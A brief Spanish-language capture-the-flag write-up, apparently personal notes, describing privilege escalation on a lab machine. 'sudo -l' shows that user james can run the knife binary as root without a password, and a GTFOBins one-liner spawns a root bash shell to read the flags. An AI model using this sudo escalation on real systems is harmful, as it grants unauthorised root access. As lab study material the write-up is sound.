#abusobinarioknife

---------

Usamos el comando `sudo -l`

![[Knife7.png]]
Y nos indica que james puede usar el binario knife, siendo root sin otorgar contraseña

Articulo de [gtfobinds](https://gtfobins.github.io/gtfobins/knife/#sudo) donde nos indica como meter un payload desde sudo para elevar privilegios, asi que lo adaptamos a nuestra maquina
![[Knife8.png]]
```shell
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```
Y listo ya ganamos acceso como root y podemos visualizar las flags

![[Knife10.png]]
